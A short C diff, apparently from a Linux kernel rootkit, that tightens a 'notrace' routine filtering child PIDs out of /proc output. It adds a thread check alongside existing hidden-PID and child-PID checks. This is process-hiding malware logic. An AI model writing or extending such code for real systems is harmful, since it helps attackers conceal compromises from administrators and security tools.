@@ -397,7 +397,7 @@ static notrace ssize_t filter_proc_children_pids(char __user *user_buf, ssize_t 
             break;
 
         if (kstrtoint(tok, 10, &pid) == 0 &&
-            !is_pid_hidden(pid) && !is_child_pid(pid)) {
+            !is_pid_hidden(pid) && !is_child_pid(pid) && !pid_is_thread(pid)) {
             if (out_len > 0)
                 out_buf[out_len++] = ' ';
             out_len += snprintf(out_buf + out_len,
